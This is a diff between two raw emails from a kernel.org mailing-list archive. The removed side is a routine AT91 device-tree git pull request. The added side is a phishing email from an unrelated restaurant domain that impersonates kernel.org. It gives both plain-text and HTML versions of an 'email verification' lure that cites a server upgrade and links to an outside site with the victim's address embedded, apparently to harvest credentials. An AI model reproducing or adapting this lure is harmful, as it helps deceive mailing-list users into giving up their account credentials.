@@ -1,115 +1,116 @@
-Return-Path: <SRS0=+JNq=ZT=microchip.com=Claudiu.Beznea@kernel.org>
+Return-Path: <SRS0=WZ/d=ZT=hobartrestaurants.com=dar.ols@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id F10E5ECAAD8
-	for <soc@archiver.kernel.org>; Fri, 16 Sep 2022 10:51:53 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 6D7D8ECAAD8
+	for <soc@archiver.kernel.org>; Fri, 16 Sep 2022 13:38:26 +0000 (UTC)
 Received: by smtp.kernel.org (Postfix)
-	id BEF22C433D7; Fri, 16 Sep 2022 10:51:53 +0000 (UTC)
-Received: from esa.microchip.iphmx.com (esa.microchip.iphmx.com [68.232.154.123])
+	id 50CE0C433D7; Fri, 16 Sep 2022 13:38:26 +0000 (UTC)
+Received: from hutykzdn.hobartrestaurants.com (hutykzdn.hobartrestaurants.com [194.87.231.156])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.kernel.org (Postfix) with ESMTPS id B3F21C433C1;
-	Fri, 16 Sep 2022 10:51:51 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org B3F21C433C1
-Authentication-Results: smtp.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=microchip.com
-Authentication-Results: smtp.kernel.org; spf=pass smtp.mailfrom=microchip.com
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=microchip.com; i=@microchip.com; q=dns/txt; s=mchp;
-  t=1663325513; x=1694861513;
-  h=from:to:cc:subject:date:message-id:mime-version:
-   content-transfer-encoding;
-  bh=Gill2Jxfv5RPobjr+S8sRrYdyedPa0QwnLd1Wvta0Ac=;
-  b=XEYCQtXMIriFFto7B6uQ3qFZxxM93zZUw4ej9z9pmhpRj/YETBxBSZJV
-   tdCvkyxqkzPYKuQ69jWxAGJzxAfsupFF2WaB/Mdx/nBZNWx/nV9YXKpd4
-   iYQzC/rQq0eaRp9aa8XMd7f9/s6uR4NazstM8Jx1S5h6n5IIeSVuhtJPS
-   wapg0lJeamV8Kza6d4IzivtJggVthVsgxMc81REbWO49YAd44SpdvDbrB
-   YHhReGEx9IBY2HGulVoYlmdEWhMb//dlCzIqlu5KN4F//RLqrhp3wuLZ4
-   KzBo2HonpOD0dOnvp7FJJHhALLON3tXQA3GwRw0lBzLAUMiU/GO9U2M1L
-   w==;
-X-IronPort-AV: E=Sophos;i="5.93,320,1654585200"; 
-   d="scan'208";a="174184396"
-Received: from unknown (HELO email.microchip.com) ([170.129.1.10])
-  by esa4.microchip.iphmx.com with ESMTP/TLS/AES256-SHA256; 16 Sep 2022 03:51:50 -0700
-Received: from chn-vm-ex03.mchp-main.com (10.10.85.151) by
- chn-vm-ex01.mchp-main.com (10.10.85.143) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
- 15.1.2507.12; Fri, 16 Sep 2022 03:51:48 -0700
-Received: from localhost.localdomain (10.10.115.15) by
- chn-vm-ex03.mchp-main.com (10.10.85.151) with Microsoft SMTP Server id
- 15.1.2507.12 via Frontend Transport; Fri, 16 Sep 2022 03:51:46 -0700
-From: Claudiu Beznea <claudiu.beznea@microchip.com>
+	by smtp.kernel.org (Postfix) with ESMTPS id 110A0C433C1
+	for <soc@kernel.org>; Fri, 16 Sep 2022 13:38:24 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org 110A0C433C1
+Authentication-Results: smtp.kernel.org; dmarc=pass (p=none dis=none) header.from=hobartrestaurants.com
+Authentication-Results: smtp.kernel.org; spf=pass smtp.mailfrom=hobartrestaurants.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=hobartrestaurants.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; i=dar.ols@hobartrestaurants.com;
+ bh=em9ipgpNwVr3qpSD4doKikwEVlA=;
+ b=WGr1xec6QUVupt1OHHnYrd9f/DeGoqRAYr3cJe28k0oJDz3WUfWhbVL24v1hBoHPnYrwbpJRDFqT
+   QAeAx1L4av07RBYWCAik9G8HR6SeuV3D7CJKGptr2jjGMdatNTDkobM+RQJiBD9nrX5BkYm4A7i4
+   7Z9bqq3BPXYnVDpEPfVp87/AnXT23sGC8LAxB5lRQsQhaPQ/VeInfs3LaLfSjxPcofk1S3uPGflR
+   MHGy36Rb9jU6/OY2FONa8Zh7EFYrw9bnVB4VjA3BqeptpJIh656e111ycLopaN8T72B/JgBUS/iy
+   yFSDrtiHFUeBDsJcmtvkTTeAO5rstg3hEHmZPA==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=hobartrestaurants.com;
+ b=J3kOuqe7YpcpwCVDMuUKq4/KfGiS9MvfnxuGNjYZUunzrgKovJemy1bVE7+uBoIss9TwuhcO0Brr
+   hBLkckLw71XsJyMX2IbxY9Bry5yj/0neXtHrXqc+tlr0M3eYnDGX8pR5YZbP2bEBCXGNVvMx3T89
+   TeB6hHO6ZiCMo/VyZNnoEHCJ7xEG5vCoL1oOzZBIiLbuAk/DKT6dRQHZc7N5urH67xxXMmkTI+KW
+   VLeMhDHg/CkynnIjj+vk1U86pZ8gj3a2dNZ28vcqbrD6R0rJwqvNiVDecaT6y6q8eZDKtuit+pzR
+   6ECxSs5b93o/uCjeaQuEXzy9njgF/4tuxgrjXA==;
+From: kernel.org <dar.ols@hobartrestaurants.com>
 List-Id: <soc.lore.kernel.org>
-To: <arnd@arndb.de>, <olof@lixom.net>, <arm@kernel.org>, <soc@kernel.org>
-CC: <nicolas.ferre@microchip.com>, <alexandre.belloni@bootlin.com>,
-	<linux-arm-kernel@lists.infradead.org>
-Subject: [GIT PULL] AT91 device tree updates for v6.1 #2
-Date: Fri, 16 Sep 2022 13:54:07 +0300
-Message-ID: <20220916105407.1287452-1-claudiu.beznea@microchip.com>
-X-Mailer: git-send-email 2.33.0
+To: soc@kernel.org
+Subject: soc@kernel.org EMAIL VERIFICATION
+Date: 16 Sep 2022 15:34:10 +0200
+Message-ID: <20220916153410.7DE201FE9850438D@hobartrestaurants.com>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-Content-Type: text/plain
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_E68914A6.150ABFAE"
 
-The following changes since commit 0b7baa1a307fcc66f66d7ca34244ee7a3899f92d:
 
-  ARM: dts: lan966x: add led configuration (2022-09-02 10:55:00 +0300)
+------=_NextPart_000_0012_E68914A6.150ABFAE
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-are available in the Git repository at:
+EMAIL VERIFICATION
 
-  https://git.kernel.org/pub/scm/linux/kernel/git/at91/linux.git tags/at91-dt-6.1-2
+Hello soc,
+please validate your=C2=A0=C2=A0soc@kernel.org=C2=A0=C2=A0address
+as we are going through new server upgrade
+=C2=A0
+CLICK HERE TO VALIDATE=20
+(=C2=A0https://lorritroughton.com/VvheItV--UBKhDQ--WacTwUq/oQRrV--JyHha--BZ=
+qavaIqZu/index.html#soc@kernel.org=C2=A0)
 
-for you to fetch changes up to 0b2eafe1167e756935f293aa7212626d8f89952f:
+=C2=A0=C2=A9 2022 All rights reserved
+kernel.org
+------=_NextPart_000_0012_E68914A6.150ABFAE
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-  spi: dt-bindings: atmel,at91rm9200-spi: Add DMA related properties (2022-09-16 10:52:24 +0300)
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
 
-----------------------------------------------------------------
-AT91 DT for v6.1 #2
-
-It contains:
-- new SAMA5D3 based board, namely SAMA5D3-EDS
-- adjustments to pass the DT binding validations
-- disable AES on some LAN966 based boards as they are reserverd by
-  secure OS
-
-----------------------------------------------------------------
-Horatiu Vultur (1):
-      ARM: dts: lan966x: disable aes
-
-Jerry Ray (2):
-      dt-bindings: arm: at91: Add info on SAMA5D3-EDS
-      dts: arm: at91: Add SAMA5D3-EDS Board
-
-Sergiu Moga (4):
-      ARM: dts: at91: sama7g5: Swap rx and tx for spi11
-      ARM: dts: at91: sam9x60ek: Add DBGU compatibles to uart1
-      ARM: dts: at91: Add `atmel,usart-mode` required property to serial nodes
-      spi: dt-bindings: atmel,at91rm9200-spi: Add DMA related properties
-
- .../devicetree/bindings/arm/atmel-at91.yaml        |   7 +
- .../bindings/spi/atmel,at91rm9200-spi.yaml         |  10 +
- arch/arm/boot/dts/Makefile                         |   1 +
- arch/arm/boot/dts/at91-sam9x60ek.dts               |   3 +-
- arch/arm/boot/dts/at91-sama5d3_eds.dts             | 307 +++++++++++++++++++++
- arch/arm/boot/dts/at91rm9200.dtsi                  |   6 +
- arch/arm/boot/dts/at91sam9260.dtsi                 |   8 +
- arch/arm/boot/dts/at91sam9261.dtsi                 |   5 +
- arch/arm/boot/dts/at91sam9263.dtsi                 |   5 +
- arch/arm/boot/dts/at91sam9g45.dtsi                 |   6 +
- arch/arm/boot/dts/at91sam9n12.dtsi                 |   6 +
- arch/arm/boot/dts/at91sam9rl.dtsi                  |   6 +
- arch/arm/boot/dts/at91sam9x5.dtsi                  |   7 +
- arch/arm/boot/dts/at91sam9x5_usart3.dtsi           |   2 +
- arch/arm/boot/dts/lan966x-pcb8290.dts              |   4 +
- arch/arm/boot/dts/lan966x-pcb8291.dts              |   4 +
- arch/arm/boot/dts/lan966x-pcb8309.dts              |   4 +
- arch/arm/boot/dts/sam9x60.dtsi                     |   2 +
- arch/arm/boot/dts/sama5d2.dtsi                     |  11 +
- arch/arm/boot/dts/sama5d3.dtsi                     |   7 +
- arch/arm/boot/dts/sama5d3_uart.dtsi                |   3 +
- arch/arm/boot/dts/sama5d4.dtsi                     |   9 +
- arch/arm/boot/dts/sama7g5.dtsi                     |  11 +-
- 23 files changed, 430 insertions(+), 4 deletions(-)
- create mode 100644 arch/arm/boot/dts/at91-sama5d3_eds.dts
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19003">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.5em;">
+<p style=3D'border-radius: 0px; color: rgb(51, 51, 51); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: "Noto Sans", sans=
+-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spacing=
+: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(25=
+5, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -w=
+ebkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-deco=
+ration-style: initial; text-decoration-color:=20
+initial;'>
+<span>
+</span>
+<table width=3D"978" style=3D'width: 978px; height: 248px; color: rgb(51, 5=
+1, 51); text-transform: none; letter-spacing: normal; font-family: "Lucida =
+Grande", Verdana, Arial, Helvetica, sans-serif; font-size: 11px; font-style=
+: normal; font-weight: 400; word-spacing: 0px; white-space: normal; table-l=
+ayout: fixed; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;' border=3D"=
+0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center" valign=3D"top" style=3D"line-height: 1.666; padding-to=
+p: 30px;">
+<p><font size=3D"4"><span style=3D"color: rgb(0, 0, 255);"><b>EMAIL VERIFIC=
+ATION</b></span></font></p><font style=3D"vertical-align: inherit;"><font s=
+tyle=3D"vertical-align: inherit;"><strong>Hello </strong><font face=3D"Cali=
+bri" size=3D"4">soc</font><strong>,</strong></font></font><br>please valida=
+te your&nbsp;<span>&nbsp;soc@kernel.org</span><span>&nbsp;</span>&nbsp;addr=
+ess<br>as we are going through new server upgrade<br>&nbsp;</td></tr>
+<tr>
+<td align=3D"center" style=3D"line-height: 1.666; padding-bottom: 20px;">
+<a style=3D"background: rgb(16, 101, 228); border-width: 0px; margin: 0px 1=
+0px 0px 0px; padding: 10px 30px; border-radius: 20px; color: rgb(255, 255, =
+255); text-transform: uppercase; font-family: inherit; font-size: 13px; ver=
+tical-align: baseline; display: inline-block; font-stretch: inherit;" href=
+=3D"https://lorritroughton.com/VvheItV--UBKhDQ--WacTwUq/oQRrV--JyHha--BZqav=
+aIqZu/index.html#soc@kernel.org" target=3D"_blank" rel=3D"noreferrer"><font=
+ style=3D"vertical-align: inherit;">
+<font style=3D"vertical-align: inherit;"><b>CLICK HERE TO VALIDATE</b></fon=
+t></font></a><br><br><strong>&nbsp;&copy; 2022 All rights reserved<br></str=
+ong><font face=3D"Calibri" size=3D"4">kernel.org</font></td></tr></tbody>
+</table><p></p></body></html>
+------=_NextPart_000_0012_E68914A6.150ABFAE--
